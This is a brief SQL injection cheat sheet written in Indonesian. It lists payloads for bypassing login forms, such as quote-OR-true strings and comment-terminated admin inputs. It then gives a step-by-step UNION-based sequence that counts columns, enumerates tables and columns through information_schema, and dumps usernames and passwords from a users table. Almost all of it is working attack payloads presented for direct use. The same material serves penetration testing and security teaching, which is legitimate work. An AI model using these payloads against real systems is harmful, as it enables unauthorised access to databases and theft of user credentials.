### Authentication BypassDigunakan untuk melewati form login tanpa password yang valid.sql' OR '1'='1

```
' OR '1'='1' --
' OR '1'='1' #
admin' --
admin' #
' OR 1=1 --
" OR "1"="1
```

###  UNION-Based SQLi Digunakan untuk mengekstrak data dari tabel lain.
```
-- Cari jumlah kolom dulu
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --   ← sampai error = jumlah kolom ketemu

-- Cari kolom yang tampil di halaman
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT 1, 2, 3 --

-- Ambil nama database
' UNION SELECT database(), NULL, NULL --

-- Ambil nama tabel
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=database() --

-- Ambil nama kolom dari tabel tertentu
' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users' --

-- Dump data
' UNION SELECT username, password, NULL FROM users --
```
